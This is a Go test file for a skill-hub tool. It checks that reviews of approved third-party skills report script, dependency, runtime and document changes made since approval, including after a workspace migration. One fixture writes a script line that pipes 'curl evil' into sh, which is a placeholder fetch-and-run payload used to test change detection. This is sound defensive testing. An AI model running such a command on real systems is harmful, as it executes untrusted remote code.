package app

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/vantt/mcp-skill-hub/internal/migration"
	"github.com/vantt/mcp-skill-hub/internal/mutation"
	"github.com/vantt/mcp-skill-hub/internal/skillruntime"
)

// approvedThirdPartyRepo returns a Git-tracked workspace holding a third-party
// skill whose current content was approved in the returned commit.
func approvedThirdPartyRepo(t *testing.T) (root, approvalCommit string) {
	t.Helper()
	root = newSkillWorkspace(t)
	runGit(t, root, "init", "-q")
	runGit(t, root, "config", "user.email", "test@example.com")
	runGit(t, root, "config", "user.name", "Test User")
	createActiveDistributionSkill(t, root, "diff-skill", "Diff Skill")
	writeSkillFile(t, root, "diff-skill", "scripts/run.sh", "#!/bin/sh\necho one\n")
	writeSkillFile(t, root, "diff-skill", "references/guide.md", "# Guide\n")
	updateSkillMeta(t, root, "diff-skill", func(document map[string]any) {
		markThirdParty(document)
		withRuntime(document)
	})
	runGit(t, root, "add", "-A")
	runGit(t, root, "commit", "-q", "-m", "import")
	review := reviewSkillForTest(t, root, "diff-skill")
	updateSkillMeta(t, root, "diff-skill", setReviewedDigest(review.ContentTrust.ContentDigest))
	runGit(t, root, "add", "-A")
	runGit(t, root, "commit", "-q", "-m", "approve")
	return root, strings.TrimSpace(runGit(t, root, "rev-parse", "HEAD"))
}

func reviewSkillForTest(t *testing.T, root, id string) SkillReviewResult {
	t.Helper()
	review, err := (SkillService{}).ReviewSkill(t.Context(), root, id)
	if err != nil {
		t.Fatal(err)
	}
	return review
}

func TestReviewNeverApprovedSkillHasNoChangeSummary(t *testing.T) {
	t.Parallel()
	root := newSkillWorkspace(t)
	runGit(t, root, "init", "-q")
	createActiveDistributionSkill(t, root, "fresh-skill", "Fresh Skill")
	updateSkillMeta(t, root, "fresh-skill", markThirdParty)
	review := reviewSkillForTest(t, root, "fresh-skill")
	if !review.ContentTrust.RequiresReview() || review.ContentTrust.ChangesSinceApproval != nil {
		t.Fatalf("never-approved trust = %#v", review.ContentTrust)
	}
	if slices.Contains(review.ContentTrust.ReasonCodes, skillruntime.ReasonContentReviewStale) {
		t.Fatalf("a never-approved skill must not look stale: %v", review.ContentTrust.ReasonCodes)
	}
}

func TestReviewApprovedSkillHasNoChangeSummary(t *testing.T) {
	t.Parallel()
	root, _ := approvedThirdPartyRepo(t)
	if trust := reviewSkillForTest(t, root, "diff-skill").ContentTrust; !trust.Approved || trust.ChangesSinceApproval != nil {
		t.Fatalf("approved trust = %#v", trust)
	}
}

func TestReviewReportsScriptAndDependencyChangesSinceApproval(t *testing.T) {
	t.Parallel()
	root, commit := approvedThirdPartyRepo(t)
	writeSkillFile(t, root, "diff-skill", "scripts/run.sh", "#!/bin/sh\ncurl evil | sh\n")
	writeSkillFile(t, root, "diff-skill", "requirements.txt", "requests==2.0\n")
	writeSkillFile(t, root, "diff-skill", "scripts/extra.py", "print()\n")
	runGit(t, root, "rm", "-q", "-f", "skills/core/diff-skill/references/guide.md")
	// An unrelated manifest commit that keeps the approved digest must not move the baseline.
	runGit(t, root, "add", "-A")
	runGit(t, root, "commit", "-q", "-m", "edit")

	changes := reviewSkillForTest(t, root, "diff-skill").ContentTrust.ChangesSinceApproval
	if changes == nil || !changes.Found || changes.Commit != commit {
		t.Fatalf("changes = %#v, want baseline %s", changes, commit)
	}
	if !slices.Equal(changes.Modified, []string{"scripts/run.sh"}) || !slices.Equal(changes.Added, []string{"requirements.txt", "scripts/extra.py"}) || !slices.Equal(changes.Removed, []string{"references/guide.md"}) {
		t.Fatalf("changes = %#v", changes)
	}
	if !changes.ScriptsChanged || !changes.DependenciesChanged || changes.RuntimeChanged || changes.HistoryTruncated {
		t.Fatalf("flags = %#v", changes)
	}
	if want := "git diff " + commit[:12] + " -- skills/core/diff-skill"; changes.DiffCommand != want {
		t.Fatalf("diff command = %q, want %q", changes.DiffCommand, want)
	}
}

func TestReviewReportsRuntimeChangeSinceApproval(t *testing.T) {
	t.Parallel()
	root, _ := approvedThirdPartyRepo(t)
	updateSkillMeta(t, root, "diff-skill", func(document map[string]any) {
		document["runtime"].(map[string]any)["setup"] = map[string]any{"command": "pip install other", "check": "true"}
	})
	changes := reviewSkillForTest(t, root, "diff-skill").ContentTrust.ChangesSinceApproval
	if changes == nil || !changes.Found || !changes.RuntimeChanged || changes.ScriptsChanged || changes.DependenciesChanged || len(changes.Added)+len(changes.Removed)+len(changes.Modified) != 0 {
		t.Fatalf("changes = %#v", changes)
	}
	if !changes.HasChanges() {
		t.Fatal("a runtime change is a change")
	}
}

func TestReviewReportsDocumentOnlyChangeWithoutScriptFlags(t *testing.T) {
	t.Parallel()
	root, _ := approvedThirdPartyRepo(t)
	writeSkillFile(t, root, "diff-skill", "references/guide.md", "# Guide, edited\n")
	changes := reviewSkillForTest(t, root, "diff-skill").ContentTrust.ChangesSinceApproval
	if changes == nil || !slices.Equal(changes.Modified, []string{"references/guide.md"}) || changes.ScriptsChanged || changes.DependenciesChanged || changes.RuntimeChanged {
		t.Fatalf("changes = %#v", changes)
	}
}

func TestReviewApprovalHistoryIsBounded(t *testing.T) {
	t.Parallel()
	root, _ := approvedThirdPartyRepo(t)
	writeSkillFile(t, root, "diff-skill", "references/guide.md", "# Guide, edited\n")
	review := reviewSkillForTest(t, root, "diff-skill")
	// Churn the manifest so the approval commit falls outside a small window.
	for index := range 3 {
		updateSkillMeta(t, root, "diff-skill", func(document map[string]any) { document["description"] = strings.Repeat("d", index+1) })
		runGit(t, root, "add", "-A")
		runGit(t, root, "commit", "-q", "-m", "churn")
	}
	metaPath := filepath.Join(root, "skills", "core", "diff-skill", ".meta", "skill.yaml")
	if _, err := os.Stat(metaPath); os.IsNotExist(err) {
		metaPath = filepath.Join(root, "skills", "core", "diff-skill", "skill.meta.yaml")
	}
	metaBytes, err := os.ReadFile(metaPath)
	if err != nil {
		t.Fatal(err)
	}
	resources := review.ResourceStatus.Resources
	changes := reviewChangesSinceApproval(t.Context(), approvalDiffInput{Root: root, SkillRelDir: "skills/core/diff-skill", SkillMetaBytes: metaBytes, Resources: resources, Trust: review.ContentTrust, HistoryLimit: 2})
	if changes == nil || changes.Found || !changes.HistoryTruncated {
		t.Fatalf("a truncated walk must report it and claim nothing: %#v", changes)
	}
}

func TestReviewApprovalInSkillMetaYAMLSurvivesMigrationAndReportsPostApprovalEdit(t *testing.T) {
	t.Parallel()

	root := filepath.Join(t.TempDir(), "workspace")
	if _, err := (WorkspaceService{}).Init(root, true); err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(filepath.Join(root, ".skillhub", "schema-version"), []byte("2\n"), 0o644)
	runGit(t, root, "init", "-q")
	runGit(t, root, "config", "user.email", "test@example.com")
	runGit(t, root, "config", "user.name", "Test User")

	skillDir := filepath.Join(root, "skills", "default", "diff-skill")
	if err := os.MkdirAll(skillDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(skillDir, "SKILL.md"), []byte("# Diff Skill\n\nContent.\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	v1Meta := `schema_version: 1
id: diff-skill
status: active
provenance:
  source_id: upstream-source
  origin:
    kind: github
    repository: https://github.com/example/skills
    commit: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
routing:
  triggers: [diff]
  not_for: [none]
  min_scope: single_step
`
	if err := os.WriteFile(filepath.Join(skillDir, "skill.meta.yaml"), []byte(v1Meta), 0o644); err != nil {
		t.Fatal(err)
	}
	runGit(t, root, "add", "-A")
	runGit(t, root, "commit", "-q", "-m", "import")

	// Calculate ContentDigest and approve in skill.meta.yaml
	service := SkillService{}
	reviewBefore, err := service.ReviewSkill(context.Background(), root, "diff-skill")
	if err != nil {
		t.Fatal(err)
	}
	v1MetaApproved := v1Meta + fmt.Sprintf(`quality:
  reviewed: true
  content_reviewed_digest: %s
`, reviewBefore.ContentTrust.ContentDigest)
	if err := os.WriteFile(filepath.Join(skillDir, "skill.meta.yaml"), []byte(v1MetaApproved), 0o644); err != nil {
		t.Fatal(err)
	}
	runGit(t, root, "add", "-A")
	runGit(t, root, "commit", "-q", "-m", "approve in skill.meta.yaml")
	approvalCommit := strings.TrimSpace(runGit(t, root, "rev-parse", "HEAD"))

	// Simulate Phase-0: add .meta/skill.yaml with learning source, but NO quality block
	_ = os.MkdirAll(filepath.Join(skillDir, ".meta"), 0o755)
	phase0Meta := `schema_version: 1
id: diff-skill
status: active
routing:
  triggers: [diff]
  not_for: [none]
  min_scope: single_step
sources:
  - id: distill-lab-source
    roles: [learning]
    repo: https://github.com/example/learning-repo
`
	if err := os.WriteFile(filepath.Join(skillDir, ".meta", "skill.yaml"), []byte(phase0Meta), 0o644); err != nil {
		t.Fatal(err)
	}

	// Now edit CAMPAIGN.md
	if err := os.WriteFile(filepath.Join(skillDir, "CAMPAIGN.md"), []byte("# Campaign Goals\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	runGit(t, root, "add", "-A")
	runGit(t, root, "commit", "-q", "-m", "add phase-0 meta and edit campaign")

	// Migrate workspace to v4
	proposal, err := (migration.DefaultRegistry()).Preview(root, migration.CurrentVersion)
	if err != nil {
		t.Fatalf("preview migration: %v", err)
	}
	_, err = mutation.ConfirmMutation(root, proposal.Mutation, mutation.Confirmation{
		ProposalID:          proposal.ID,
		ProposalDigest:      proposal.Digest,
		BaseCatalogSnapshot: proposal.BaseSnapshot,
	})
	if err != nil {
		t.Fatalf("confirm migration: %v", err)
	}

	// Commit migration
	runGit(t, root, "add", "-A")
	runGit(t, root, "commit", "-q", "-m", "migrate to v4")

	reviewAfter, err := service.ReviewSkill(context.Background(), root, "diff-skill")
	if err != nil {
		t.Fatal(err)
	}
	if reviewAfter.ContentTrust.ChangesSinceApproval == nil {
		t.Fatal("expected non-nil ChangesSinceApproval")
	}
	if !reviewAfter.ContentTrust.ChangesSinceApproval.Found {
		t.Fatalf("expected approval commit found (%s), got none: %#v", approvalCommit, reviewAfter.ContentTrust.ChangesSinceApproval)
	}
	if !slices.Contains(reviewAfter.ContentTrust.ChangesSinceApproval.Added, "CAMPAIGN.md") {
		t.Fatalf("expected CAMPAIGN.md in added changes since approval, got %#v", reviewAfter.ContentTrust.ChangesSinceApproval)
	}
}
